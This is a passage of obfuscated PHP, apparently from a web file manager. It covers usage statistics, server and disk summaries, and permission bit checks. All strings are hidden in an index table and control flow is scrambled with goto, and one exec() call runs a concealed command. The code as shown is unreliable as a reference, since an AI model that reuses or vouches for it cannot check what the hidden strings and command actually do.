$_SERVER[Öíæ€“”≠éÏË]; $dÓóù‰ß≥Ü = strtotime(date($E‘ÏéÙæäÊ[1645], strtotime($C§≠á¥º≤Ê))); $eﬁÛ—ãª¡Ï = strtotime(date($E‘ÏéÙæäÊ[1646], strtotime($C§≠á¥º≤Ê))); goto dùí¶“ﬂïÑ; dùí¶“ﬂïÑ: $Aù Ò∆¿©á = array($E‘ÏéÙæäÊ[194] => array($E‘ÏéÙæäÊ[981], $eﬁÛ—ãª¡Ï)); $BçÉÒù‡÷∏ = Model($E‘ÏéÙæäÊ[520])->where($Aù Ò∆¿©á)->count($E‘ÏéÙæäÊ[1538]); $Aù Ò∆¿©á[$E‘ÏéÙæäÊ[194]] = array($E‘ÏéÙæäÊ[331], array($dÓóù‰ß≥Ü, $eﬁÛ—ãª¡Ï)); goto Fî€≠ëëµÛ; c∆öùç∏’ï: $dË¯Œ∫›ä› = array($E‘ÏéÙæäÊ[222] => $C§≠á¥º≤Ê, $E‘ÏéÙæäÊ[738] => (int) $BçÉÒù‡÷∏, $E‘ÏéÙæäÊ[1634] => (int) $c¬‚âàû«±, $E‘ÏéÙæäÊ[1635] => (int) $FÓ‰œæƒå©); return $this->insert($dË¯Œ∫›ä›); goto C˘áÃ≤õø¶; Fî€≠ëëµÛ: $c¬‚âàû«± = Model($E‘ÏéÙæäÊ[520])->where($Aù Ò∆¿©á)->count($E‘ÏéÙæäÊ[1538]); $Aù Ò∆¿©á[$E‘ÏéÙæäÊ[29]] = $E‘ÏéÙæäÊ[1647]; $FÓ‰œæƒå© = Model($E‘ÏéÙæäÊ[1648])->where($Aù Ò∆¿©á)->count($E‘ÏéÙæäÊ[1649]); goto c∆öùç∏’ï; C˘áÃ≤õø¶: } public function _recordStore($cŒÑëﬂÿ€Í = '') { goto FçÑ©√äßÑ; EŸ¡Òé–≈®: $aÒÿ∫†Ìë√ = Model($F≤‰óËÇµ∆[803])->where($dãÕÏæãºƒ)->sum($F≤‰óËÇµ∆[78]); $D†ÀáïÌˆË = array($F≤‰óËÇµ∆[222] => $cŒÑëﬂÿ€Í, $F≤‰óËÇµ∆[736] => (int) $cïÏΩ›ä¿«, $F≤‰óËÇµ∆[1638] => (int) $A ÒÕÕŸƒ‹, $F≤‰óËÇµ∆[1639] => (int) $c™Í‰ÆñÌÉ, $F≤‰óËÇµ∆[1640] => (int) $aÒÿ∫†Ìë√); return $this->insert($D†ÀáïÌˆË); goto b≤Îí÷É¶á; E‚‰€ ◊ë∞: $A ÒÕÕŸƒ‹ = Model($F≤‰óËÇµ∆[451])->where($dãÕÏæãºƒ)->sum($F≤‰óËÇµ∆[78]); $dãÕÏæãºƒ[$F≤‰óËÇµ∆[404]] = 0; $cïÏΩ›ä¿« = Model($F≤‰óËÇµ∆[803])->where($dãÕÏæãºƒ)->sum($F≤‰óËÇµ∆[78]); goto A¬±ÇÜ»µË; A¬±ÇÜ»µË: $dãÕÏæãºƒ[$F≤‰óËÇµ∆[405]] = 1; $c™Í‰ÆñÌÉ = Model($F≤‰óËÇµ∆[803])->where($dãÕÏæãºƒ)->sum($F≤‰óËÇµ∆[78]); $dãÕÏæãºƒ[$F≤‰óËÇµ∆[405]] = 2; goto EŸ¡Òé–≈®; FçÑ©√äßÑ: $F≤‰óËÇµ∆ =& $_SERVER[Öíæ€“”≠éÏË]; $c≤©ﬁêø≥ = strtotime(date($F≤‰óËÇµ∆[1646], strtotime($cŒÑëﬂÿ€Í))); $dãÕÏæãºƒ = array($F≤‰óËÇµ∆[194] => array($F≤‰óËÇµ∆[981], $c≤©ﬁêø≥)); goto E‚‰€ ◊ë∞; b≤Îí÷É¶á: } public function trend($FÀ‡ûä”ˆ¨, $f©¡Ì∞úòÑ) { goto E‹äñó€ë≠; E‹äñó€ë≠: $dá«’»ÂﬁÖ =& $_SERVER[Öíæ€“”≠éÏË]; if (!$this->init($FÀ‡ûä”ˆ¨)) { return !1; } $Fí·‘∂ü’É = $this->trendList($FÀ‡ûä”ˆ¨); goto Dìü€êÍêÊ; c…æªﬁê“Ç: if (empty($Fí·‘∂ü’É)) { $eÀ±¨≤Óôﬁ = date($dá«’»ÂﬁÖ[1641], strtotime($dá«’»ÂﬁÖ[1642])); $DﬁÒÜî≈∆„ = array($dá«’»ÂﬁÖ[222] => $eÀ±¨≤Óôﬁ); foreach ($AÛòÇÇ„≈≈[$FÀ‡ûä”ˆ¨] as $e∏ΩŸà∑´Ã => $e“âÓß°ü›) { $DﬁÒÜî≈∆„[$e∏ΩŸà∑´Ã] = 0; } $Fí·‘∂ü’É[] = $DﬁÒÜî≈∆„; } $aü˘¬£»«• = array(); foreach ($Fí·‘∂ü’É as $e“âÓß°ü›) { if ($FÀ‡ûä”ˆ¨ == $dá«’»ÂﬁÖ[1636] && $e“âÓß°ü›[$dá«’»ÂﬁÖ[1638]] > $e“âÓß°ü›[$dá«’»ÂﬁÖ[736]]) { $e“âÓß°ü›[$dá«’»ÂﬁÖ[1638]] = $e“âÓß°ü›[$dá«’»ÂﬁÖ[736]]; } foreach ($AÛòÇÇ„≈≈[$FÀ‡ûä”ˆ¨] as $e∏ΩŸà∑´Ã => $E©€ÿ¬§Ò¢) { $bﬁäÕØáÍ = array($dá«’»ÂﬁÖ[222] => $e“âÓß°ü›[$dá«’»ÂﬁÖ[222]], $dá«’»ÂﬁÖ[1441] => $E©€ÿ¬§Ò¢); $bﬁäÕØáÍ[$F£’ô◊’À¶[$FÀ‡ûä”ˆ¨]] = isset($e“âÓß°ü›[$e∏ΩŸà∑´Ã]) ? $e“âÓß°ü›[$e∏ΩŸà∑´Ã] : 0; $aü˘¬£»«•[] = $bﬁäÕØáÍ; } } goto e›Üå¡ñ´Ü; e›Üå¡ñ´Ü: return $aü˘¬£»«•; goto aÖá˜ﬁüœè; Dìü€êÍêÊ: if ($Fí·‘∂ü’É && $f©¡Ì∞úòÑ != $dá«’»ÂﬁÖ[1511]) { $A„äˆÈ∑¥˘ = $Fí·‘∂ü’É[0][$dá«’»ÂﬁÖ[222]]; $BÏÑØ≥º€å = $this->validDate($f©¡Ì∞úòÑ, $A„äˆÈ∑¥˘); $eÆóÏÖ·ç– = array(); $c≠—ß£ Í¯ = array_to_keyvalue($Fí·‘∂ü’É, $dá«’»ÂﬁÖ[222]); foreach ($BÏÑØ≥º€å as $eÀ±¨≤Óôﬁ) { if (isset($c≠—ß£ Í¯[$eÀ±¨≤Óôﬁ])) { $bﬁäÕØáÍ = $c≠—ß£ Í¯[$eÀ±¨≤Óôﬁ]; } else { $bﬁäÕØáÍ = end($Fí·‘∂ü’É); $bﬁäÕØáÍ[$dá«’»ÂﬁÖ[222]] = $eÀ±¨≤Óôﬁ; if ($FÀ‡ûä”ˆ¨ == $dá«’»ÂﬁÖ[576]) { $bﬁäÕØáÍ[$dá«’»ÂﬁÖ[1634]] = $bﬁäÕØáÍ[$dá«’»ÂﬁÖ[1635]] = 0; } } $eÆóÏÖ·ç–[] = $bﬁäÕØáÍ; } $Fí·‘∂ü’É = $eÆóÏÖ·ç–; } $AÛòÇÇ„≈≈ = array($dá«’»ÂﬁÖ[576] => array($dá«’»ÂﬁÖ[738] => LNG($dá«’»ÂﬁÖ[1650]), $dá«’»ÂﬁÖ[1634] => LNG($dá«’»ÂﬁÖ[1651]), $dá«’»ÂﬁÖ[1635] => LNG($dá«’»ÂﬁÖ[1652])), $dá«’»ÂﬁÖ[1636] => array($dá«’»ÂﬁÖ[736] => LNG($dá«’»ÂﬁÖ[1653]), $dá«’»ÂﬁÖ[1638] => LNG($dá«’»ÂﬁÖ[1654]), $dá«’»ÂﬁÖ[1639] => LNG($dá«’»ÂﬁÖ[1655]), $dá«’»ÂﬁÖ[1640] => LNG($dá«’»ÂﬁÖ[1656]))); $F£’ô◊’À¶ = array($dá«’»ÂﬁÖ[576] => $dá«’»ÂﬁÖ[1657], $dá«’»ÂﬁÖ[1636] => $dá«’»ÂﬁÖ[78]); goto c…æªﬁê“Ç; aÖá˜ﬁüœè: } public function validDate($d˘ºÑ–Õ˘Ü, $f¢≈ˆÑ›øπ) { goto fœçπËè¬ç; fœçπËè¬ç: $C˜Ùµ≤‘◊¶ =& $_SERVER[Öíæ€“”≠éÏË]; $BÎÂÊ·≈–Ô = date($C˜Ùµ≤‘◊¶[1641], strtotime($C˜Ùµ≤‘◊¶[1642])); $aâß≥ëØ»≠ = array($BÎÂÊ·≈–Ô); goto Fåôä“©Üó; Fåôä“©Üó: switch ($d˘ºÑ–Õ˘Ü) { case $C˜Ùµ≤‘◊¶[1518]: $Cí›ﬂòíˆ£ = mktime(0, 0, 0, date($C˜Ùµ≤‘◊¶[1658]), date($C˜Ùµ≤‘◊¶[1264]) - date($C˜Ùµ≤‘◊¶[1325]) + 7 - 7, date($C˜Ùµ≤‘◊¶[1659])); $a˜’ìó≥•® = 0; do { $düÖÀµëË¯ = date($C˜Ùµ≤‘◊¶[1641], $Cí›ﬂòíˆ£ - 3600 * 24 * 7 * $a˜’ìó≥•®); $aâß≥ëØ»≠[] = $düÖÀµëË¯; $a˜’ìó≥•®++; } while ($f¢≈ˆÑ›øπ < $düÖÀµëË¯); break; case $C˜Ùµ≤‘◊¶[1516]: $a˜’ìó≥•® = 1; do { $cÙÕºΩ„π∫ = date($C˜Ùµ≤‘◊¶[1660], strtotime("\55\40{$a˜’ìó≥•®}\x20\x6d\157\156\164\150\163")); $aâß≥ëØ»≠[] = $cÙÕºΩ„π∫; $a˜’ìó≥•®++; } while ($f¢≈ˆÑ›øπ < $cÙÕºΩ„π∫); break; case $C˜Ùµ≤‘◊¶[1661]: $EÉΩù”ï∂û = (int) date($C˜Ùµ≤‘◊¶[1659], strtotime($f¢≈ˆÑ›øπ)); $bÖ¢–›úæä = (int) date($C˜Ùµ≤‘◊¶[1659]); if ($EÉΩù”ï∂û >= $bÖ¢–›úæä) { break; } for ($EÉΩù”ï∂û; $EÉΩù”ï∂û < $bÖ¢–›úæä; $EÉΩù”ï∂û++) { $aâß≥ëØ»≠[] = $EÉΩù”ï∂û . $C˜Ùµ≤‘◊¶[1662]; } break; default: break; } if ($f¢≈ˆÑ›øπ > end($aâß≥ëØ»≠)) { array_pop($aâß≥ëØ»≠); } sort($aâß≥ëØ»≠); goto DæÇ©◊∂Ç˘; DæÇ©◊∂Ç˘: return $aâß≥ëØ»≠; goto b≈∏â◊ë¢≤; b≈∏â◊ë¢≤: } public function listTable($BÔóª∞ı÷û) { $fôî∞’‰´á = ucfirst($BÔóª∞ı÷û); return Model($fôî∞’‰´á)->listData(); } public function option($aö¯â£öƒ‹) { $BÆéÀî‰ÍÂ = $_SERVER[Öíæ€“”≠éÏË][1663] . ucfirst($aö¯â£öƒ‹); return $this->{$BÆéÀî‰ÍÂ}(); } private function optionUser() { goto cÕÉ’“œü™; F¯Ó™œË¥ƒ: if (!$B¥Â÷∂Õõ◊) { $B¥Â÷∂Õõ◊ = 1; } $D≥Œ· ÿ”ﬂ = array($Aíî√ã§™‡[1665] => array($Aíî√ã§™‡[982], $eÓâ›¥æ·ﬂ)); $c≤é”Ö‡º = Model($Aíî√ã§™‡[520])->where($D≥Œ· ÿ”ﬂ)->count($Aíî√ã§™‡[1538]); goto bÁ¶õˆ÷Œ“; a÷æ€êÏﬂ©: $BÕ∑≥ìë•‚ = intval($GLOBALS[$Aíî√ã§™‡[6]][$Aíî√ã§™‡[347]][$Aíî√ã§™‡[1497]]) / 3600; $aÙ†—ﬂÿ⁄ë = strtotime("\x2d{$BÕ∑≥ìë•‚}\40\150\x6f\x75\x72\163"); $eÓâ›¥æ·ﬂ = strtotime(date($Aíî√ã§™‡[1645])); goto d√™˜‰é√ã; cÕÉ’“œü™: $Aíî√ã§™‡ =& $_SERVER[Öíæ€“”≠éÏË]; $d¯™ÒÉ¶•û = Model($Aíî√ã§™‡[520])->count($Aíî√ã§™‡[1538]); $EÑÉÚ»Ÿ÷Ü = Model($Aíî√ã§™‡[520])->where($Aíî√ã§™‡[1664])->count($Aíî√ã§™‡[1538]); goto a÷æ€êÏﬂ©; d√™˜‰é√ã: if ($aÙ†—ﬂÿ⁄ë < $eÓâ›¥æ·ﬂ) { $aÙ†—ﬂÿ⁄ë = $eÓâ›¥æ·ﬂ; } $D≥Œ· ÿ”ﬂ = array($Aíî√ã§™‡[1665] => array($Aíî√ã§™‡[982], $aÙ†—ﬂÿ⁄ë)); $B¥Â÷∂Õõ◊ = (int) Model($Aíî√ã§™‡[520])->where($D≥Œ· ÿ”ﬂ)->count($Aíî√ã§™‡[1538]); goto F¯Ó™œË¥ƒ; bÁ¶õˆ÷Œ“: return array($Aíî√ã§™‡[732] => (int) $d¯™ÒÉ¶•û, $Aíî√ã§™‡[1666] => (int) ($d¯™ÒÉ¶•û - $EÑÉÚ»Ÿ÷Ü), $Aíî√ã§™‡[1667] => (int) $EÑÉÚ»Ÿ÷Ü, $Aíî√ã§™‡[1668] => (int) $c≤é”Ö‡º, $Aíî√ã§™‡[1669] => $B¥Â÷∂Õõ◊); goto DêÕ‡∞ø¨£; DêÕ‡∞ø¨£: } private function optionFile() { goto bì©Üë¡√à; AÔç´êä®ã: $AÓ¿†ﬂ‘„Î = $cã©∆ËÔ†ç[$A¶ÿÍÈÇ⁄É[1638]]; $Dêáıå£◊ = Model($A¶ÿÍÈÇ⁄É[803])->where(array($A¶ÿÍÈÇ⁄É[404] => 0))->count($A¶ÿÍÈÇ⁄É[396]); $A›Áô˘ÊÈÂ = array($A¶ÿÍÈÇ⁄É[404] => 0, $A¶ÿÍÈÇ⁄É[194] => array($A¶ÿÍÈÇ⁄É[982], strtotime(date($A¶ÿÍÈÇ⁄É[1645])))); goto BÕÖÉÔÙÔƒ; BÕÖÉÔÙÔƒ: $E¿∆Á≠›ªë = Model($A¶ÿÍÈÇ⁄É[803])->where($A›Áô˘ÊÈÂ)->sum($A¶ÿÍÈÇ⁄É[78]); $Aé¬Êâú∏ß = Model($A¶ÿÍÈÇ⁄É[803])->where($A›Áô˘ÊÈÂ)->count($A¶ÿÍÈÇ⁄É[396]); return array($A¶ÿÍÈÇ⁄É[736] => $fê”«ÑäÚ¬, $A¶ÿÍÈÇ⁄É[1638] => $AÓ¿†ﬂ‘„Î, $A¶ÿÍÈÇ⁄É[1670] => $fê”«ÑäÚ¬ - $AÓ¿†ﬂ‘„Î, $A¶ÿÍÈÇ⁄É[1671] => (int) $E¿∆Á≠›ªë, $A¶ÿÍÈÇ⁄É[738] => (int) $Dêáıå£◊, $A¶ÿÍÈÇ⁄É[1672] => (int) $Aé¬Êâú∏ß); goto BÇ»—Œ‚¬Í; bì©Üë¡√à: $A¶ÿÍÈÇ⁄É =& $_SERVER[Öíæ€“”≠éÏË]; $cã©∆ËÔ†ç = $this->sourceSize(); $fê”«ÑäÚ¬ = $cã©∆ËÔ†ç[$A¶ÿÍÈÇ⁄É[78]]; goto AÔç´êä®ã; BÇ»—Œ‚¬Í: } private function optionAccess() { $béÇÇÑè§“ =& $_SERVER[Öíæ€“”≠éÏË]; return array($béÇÇÑè§“[732] => $this->typeLogCnt(), $béÇÇÑè§“[107] => $this->typeLogCnt($béÇÇÑè§“[107]), $béÇÇÑè§“[431] => $this->typeLogCnt($béÇÇÑè§“[431]), $béÇÇÑè§“[1673] => $this->typeLogCnt($béÇÇÑè§“[1673]), $béÇÇÑè§“[1674] => $this->typeLogCnt($béÇÇÑè§“[1674]), $béÇÇÑè§“[576] => $this->typeLogCnt($béÇÇÑè§“[33], $béÇÇÑè§“[1649])); } private function typeLogCnt($f—ï•…ëàÊ = '', $a‚Ê‹º¢ΩÈ = "\x69\x64") { goto FÉù·í«ÌÈ; FÉù·í«ÌÈ: $e’·çœñ¥‹ =& $_SERVER[Öíæ€“”≠éÏË]; $dıÀ≤®û€ô = array($e’·çœñ¥‹[107] => array($e’·çœñ¥‹[1675], $e’·çœñ¥‹[1676]), $e’·çœñ¥‹[431] => array($e’·çœñ¥‹[1677], $e’·çœñ¥‹[1678]), $e’·çœñ¥‹[1673] => array($e’·çœñ¥‹[1679], $e’·çœñ¥‹[1680], $e’·çœñ¥‹[1681]), $e’·çœñ¥‹[1674] => array($e’·çœñ¥‹[1682], $e’·çœñ¥‹[1683]), $e’·çœñ¥‹[1684] => array($e’·çœñ¥‹[1685], $e’·çœñ¥‹[1686], $e’·çœñ¥‹[1687])); $C®ıÖ·›Ÿ™ = strtotime(date($e’·çœñ¥‹[1645])); goto dåëäÎÙç‚; c⁄Ü˜˘Ü„¿: return (int) $Aˆ¥Œ◊ã©Â; goto eΩ”∆â ãä; dåëäÎÙç‚: $C ≤»ëØ⁄À = array($e’·çœñ¥‹[194] => array($e’·çœñ¥‹[982], $C®ıÖ·›Ÿ™)); if ($f—ï•…ëàÊ) { $C ≤»ëØ⁄À[$e’·çœñ¥‹[29]] = array($e’·çœñ¥‹[7], $dıÀ≤®û€ô[$f—ï•…ëàÊ]); } $Aˆ¥Œ◊ã©Â = Model($e’·çœñ¥‹[1648])->where($C ≤»ëØ⁄À)->count($a‚Ê‹º¢ΩÈ); goto c⁄Ü˜˘Ü„¿; eΩ”∆â ãä: } private function optionServer() { goto bŒÈ◊√ó∏…; bŒÈ◊√ó∏…: $B™–ÇŒÜ≈ =& $_SERVER[Öíæ€“”≠éÏË]; $BÒ◊è“Çî¢ = $this->diskDriver(); $e Úò„íñø = KodIO::defaultDriver(); goto Eè∫õÿÊΩÔ; C≥©á•∂Çå: return array($B™–ÇŒÜ≈[1690] => $BÒ◊è“Çî¢ ? $BÒ◊è“Çî¢[$B™–ÇŒÜ≈[1691]] : 0, $B™–ÇŒÜ≈[1692] => $BÒ◊è“Çî¢ ? $BÒ◊è“Çî¢[$B™–ÇŒÜ≈[1693]] : 0, $B™–ÇŒÜ≈[1694] => (int) $e Úò„íñø[$B™–ÇŒÜ≈[1691]] * 1024 * 1024 * 1024, $B™–ÇŒÜ≈[1695] => (int) $F≈§∞÷⁄’ƒ, $B™–ÇŒÜ≈[1696] => ucfirst($báÊê∫ó◊≈), $B™–ÇŒÜ≈[1697] => $B™–ÇŒÜ≈[1698] . PHP_VERSION, $B™–ÇŒÜ≈[1699] => phpBuild64() ? 64 : 32, $B™–ÇŒÜ≈[731] => str_replace($B™–ÇŒÜ≈[1700], $B™–ÇŒÜ≈[959], $cÑŸàÍéˆØ), $B™–ÇŒÜ≈[347] => ucfirst($F—∏üæ≈˜Ê), $B™–ÇŒÜ≈[28] => $_SERVER[$B™–ÇŒÜ≈[1701]]); goto EÛÃ©‘Èçú; Eè∫õÿÊΩÔ: $AΩ‘øö‘∞Æ = array($B™–ÇŒÜ≈[795] => $e Úò„íñø[$B™–ÇŒÜ≈[394]]); $F≈§∞÷⁄’ƒ = Model($B™–ÇŒÜ≈[451])->where($AΩ‘øö‘∞Æ)->sum($B™–ÇŒÜ≈[78]); $C«ñöú«ﬂÑ = explode($B™–ÇŒÜ≈[50], $_SERVER[$B™–ÇŒÜ≈[142]]); goto c§‡Õ¯¯∫à; c§‡Õ¯¯∫à: $báÊê∫ó◊≈ = $C«ñöú«ﬂÑ[0]; $cªÂ”Òïòæ = $GLOBALS[$B™–ÇŒÜ≈[6]][$B™–ÇŒÜ≈[17]]; $cÑŸàÍéˆØ = $cªÂ”Òïòæ[$B™–ÇŒÜ≈[943]]; goto b‘ÍÂ©∂¯Ü; b‘ÍÂ©∂¯Ü: if ($cÑŸàÍéˆØ == $B™–ÇŒÜ≈[768]) { $C∞´ıÏ÷≤Ñ = explode($B™–ÇŒÜ≈[1176], $cªÂ”Òïòæ[$B™–ÇŒÜ≈[942]]); $cÑŸàÍéˆØ = $C∞´ıÏ÷≤Ñ[0]; } if ($cÑŸàÍéˆØ == $B™–ÇŒÜ≈[771] || $cÑŸàÍéˆØ == $B™–ÇŒÜ≈[772]) { $dËôÙºÂ‰¢ = Model()->db()->query($B™–ÇŒÜ≈[1688]); $Fﬁ≤ø§à∫≥ = $dËôÙºÂ‰¢[0] && isset($dËôÙºÂ‰¢[0][$B™–ÇŒÜ≈[1440]]) ? $dËôÙºÂ‰¢[0][$B™–ÇŒÜ≈[1440]] : 0; $cÑŸàÍéˆØ = $B™–ÇŒÜ≈[1689] . ($Fﬁ≤ø§à∫≥ ? $B™–ÇŒÜ≈[8] . $Fﬁ≤ø§à∫≥ : $B™–ÇŒÜ≈[33]); } $F—∏üæ≈˜Ê = $GLOBALS[$B™–ÇŒÜ≈[6]][$B™–ÇŒÜ≈[347]][$B™–ÇŒÜ≈[805]]; goto C≥©á•∂Çå; EÛÃ©‘Èçú: } private function diskDriver() { goto f§⁄ì“∂çÇ; f§⁄ì“∂çÇ: $f∫èÚŸ‡«— =& $_SERVER[Öíæ€“”≠éÏË]; $fëŒï≥´ëÉ = $f∫èÚŸ‡«—[8]; $C®·ëµ’öµ = $GLOBALS[$f∫èÚŸ‡«—[6]][$f∫èÚŸ‡«—[1702]] == $f∫èÚŸ‡«—[1703]; goto aä™ŸàÉÖÉ; B¯Ÿ⁄‡ƒ„·: $E√“´ÖåË≤ = $Fñ‘¨ìµâ… - @disk_free_space($fëŒï≥´ëÉ); return array($f∫èÚŸ‡«—[1691] => $Fñ‘¨ìµâ…, $f∫èÚŸ‡«—[1693] => $E√“´ÖåË≤); goto F∞Õ„î¶ûâ; aä™ŸàÉÖÉ: if ($C®·ëµ’öµ) { $fëŒï≥´ëÉ = $f∫èÚŸ‡«—[1704]; if (function_exists($f∫èÚŸ‡«—[1705])) { exec($f∫èÚŸ‡«—[1706], $D£±õº±˜†); $fëŒï≥´ëÉ = $D£±õº±˜†[1] . $f∫èÚŸ‡«—[8]; } } if (!file_exists($fëŒï≥´ëÉ)) { return; } $Fñ‘¨ìµâ… = @disk_total_space($fëŒï≥´ëÉ); goto B¯Ÿ⁄‡ƒ„·; F∞Õ„î¶ûâ: } public function fileChart($Dﬁ€ıä”¯—) { goto D¡≥´íÒõÌ; C≈¨ÕœÑ‰Û: $Eú˘£¬Ò◊”[$D¶⁄±Ù∫ÍÈ[405]] = 2; $dÍÉÂ‘àÒ = Model($D¶⁄±Ù∫ÍÈ[803])->where($Eú˘£¬Ò◊”)->sum($D¶⁄±Ù∫ÍÈ[78]); return array($D¶⁄±Ù∫ÍÈ[736] => $bã∞Âˆßå—[$D¶⁄±Ù∫ÍÈ[78]], $D¶⁄±Ù∫ÍÈ[1638] => $bã∞Âˆßå—[$D¶⁄±Ù∫ÍÈ[1638]], $D¶⁄±Ù∫ÍÈ[1639] => (int) $a¥É–¿˜ê≠, $D¶⁄±Ù∫ÍÈ[1640] => (int) $dÍÉÂ‘àÒ); goto f≈≠≠ÛÍÿÖ; E⁄·é’Ã˜ô: $bã∞Âˆßå— = $this->sourceSize(); $Eú˘£¬Ò◊” = array($D¶⁄±Ù∫ÍÈ[479] => 0, $D¶⁄±Ù∫ÍÈ[405] => 1); $a¥É–¿˜ê≠ = Model($D¶⁄±Ù∫ÍÈ[803])->where($Eú˘£¬Ò◊”)->sum($D¶⁄±Ù∫ÍÈ[78]); goto C≈¨ÕœÑ‰Û; D¡≥´íÒõÌ: $D¶⁄±Ù∫ÍÈ =& $_SERVER[Öíæ€“”≠éÏË]; if (isset($Dﬁ€ıä”¯—[$D¶⁄±Ù∫ÍÈ[1538]])) { return Model($D¶⁄±Ù∫ÍÈ[803])->userFileTypeProfile($Dﬁ€ıä”¯—[$D¶⁄±Ù∫ÍÈ[1538]]); } if (isset($Dﬁ€ıä”¯—[$D¶⁄±Ù∫ÍÈ[1707]])) { return Model($D¶⁄±Ù∫ÍÈ[803])->groupFileTypeProfile($Dﬁ€ıä”¯—[$D¶⁄±Ù∫ÍÈ[1707]]); } goto E⁄·é’Ã˜ô; f≈≠≠ÛÍÿÖ: } private function sourceSize() { $cáøÚ±çç‡ =& $_SERVER[Öíæ€“”≠éÏË]; $f—ù©áÓè± = Model($cáøÚ±çç‡[803])->where(array($cáøÚ±çç‡[404] => 0))->sum($cáøÚ±çç‡[78]); $bé∫√Îà¡ô = Model($cáøÚ±çç‡[451])->sum($cáøÚ±çç‡[78]); if ($bé∫√Îà¡ô > $f—ù©áÓè±) { $bé∫√Îà¡ô = $f—ù©áÓè±; } return array($cáøÚ±çç‡[78] => (int) $f—ù©áÓè±, $cáøÚ±çç‡[1638] => (int) $bé∫√Îà¡ô); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $B±ÔÒã›àé =& $_SERVER[Öíæ€“”≠éÏË]; $cÂÙçú·Ó∂ = array(array($B±ÔÒã›àé[414] => LNG($B±ÔÒã›àé[1708]), $B±ÔÒã›àé[1709] => $B±ÔÒã›àé[1710], $B±ÔÒã›àé[1711] => 1, $B±ÔÒã›àé[1712] => 1, $B±ÔÒã›àé[1713] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($B±ÔÒã›àé[414] => LNG($B±ÔÒã›àé[1714]), $B±ÔÒã›àé[1709] => $B±ÔÒã›àé[1715], $B±ÔÒã›àé[1711] => 2, $B±ÔÒã›àé[1712] => 1, $B±ÔÒã›àé[1713] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($B±ÔÒã›àé[414] => LNG($B±ÔÒã›àé[1716]), $B±ÔÒã›àé[1709] => $B±ÔÒã›àé[1717], $B±ÔÒã›àé[1711] => 3, $B±ÔÒã›àé[1712] => 1, $B±ÔÒã›àé[1713] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($B±ÔÒã›àé[414] => LNG($B±ÔÒã›àé[1718]), $B±ÔÒã›àé[1709] => $B±ÔÒã›àé[1719], $B±ÔÒã›àé[1711] => 4, $B±ÔÒã›àé[1712] => 1, $B±ÔÒã›àé[1713] => self::AUTH_SHOW | self::AUTH_VIEW), array($B±ÔÒã›àé[414] => LNG($B±ÔÒã›àé[1720]), $B±ÔÒã›àé[1709] => $B±ÔÒã›àé[1721], $B±ÔÒã›àé[1711] => 5, $B±ÔÒã›àé[1712] => 1, $B±ÔÒã›àé[1713] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($B±ÔÒã›àé[414] => LNG($B±ÔÒã›àé[1722]), $B±ÔÒã›àé[1709] => $B±ÔÒã›àé[1723], $B±ÔÒã›àé[1711] => 6, $B±ÔÒã›àé[1712] => 1, $B±ÔÒã›àé[1713] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($B±ÔÒã›àé[414] => LNG($B±ÔÒã›àé[1724]), $B±ÔÒã›àé[1709] => $B±ÔÒã›àé[1725], $B±ÔÒã›àé[1711] => 7, $B±ÔÒã›àé[1712] => 1, $B±ÔÒã›àé[1713] => 0)); return $cÂÙçú·Ó∂; } public static function authCheck($cÔß‚Ö•ø‚, $eä›Ëæ†ÜÛ) { $cÔß‚Ö•ø‚ = intval($cÔß‚Ö•ø‚); if ($GLOBALS[$_SERVER[Öíæ€“”≠éÏË][486]]) { return !0; } if ($cÔß‚Ö•ø‚ <= 0) { return !1; } if (($cÔß‚Ö•ø‚ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($cÔß‚Ö•ø‚ & $eä›Ëæ†ÜÛ); } public static function authCheckShow($D¿°á—ï¶é) { return self::authCheck($D¿°á—ï¶é, self::AUTH_SHOW); } public static function authCheckView($eÁ⁄æõç¬Á) { return self::authCheck($eÁ⁄æõç¬Á, self::AUTH_VIEW); } public static function authCheckDownload($CÛŸã˘†¡ü) { return self::authCheck($CÛŸã˘†¡ü, self::AUTH_DOWNLOAD); } public static function authCheckUpload($DØ‰ΩÍù±¥) { return self::authCheck($DØ‰ΩÍù±¥, self::AUTH_UPLOAD); } public static function authCheckEdit($Cìƒ™”ìÛ›) { return self::authCheck($Cìƒ™”ìÛ›, self::AUTH_EDIT); } public static function authCheckRemove($C›ïœ££ü†) { return self::authCheck($C›ïœ££ü†, self::AUTH_REMOVE); } public static function authCheckShare($dçÍ©ÏôÒ©) { return self::authCheck($dçÍ©ÏôÒ©, self::AUTH_SHARE); } public static function authCheckComment($b·ﬂ¡íΩÙé) { return self::authCheck($b·ﬂ¡íΩÙé, self::AUTH_COMMENT); } public static function authCheckEvent($b··£ä∑¬º) { return self::authCheck($b··£ä∑¬º, self::AUTH_EVENT); } public static function authCheckRoot($EáÍíÿıè‘) { return self::authCheck($EáÍíÿıè‘, self::AUTH_ROOT); } public static function authCheckAction($aπ£ÖÀù´∫, $EêÓÇØÇ∆ô) { goto AÕã–©¿´≠; CÛ†¥∆ˆ∂ﬁ: $d¢°Í¶Áùª = $cëèë∑∏¥á[$EêÓÇØÇ∆ô]; $aπ£ÖÀù´∫ = intval($aπ£ÖÀù´∫); if ($aπ£ÖÀù´∫ <= 0) { 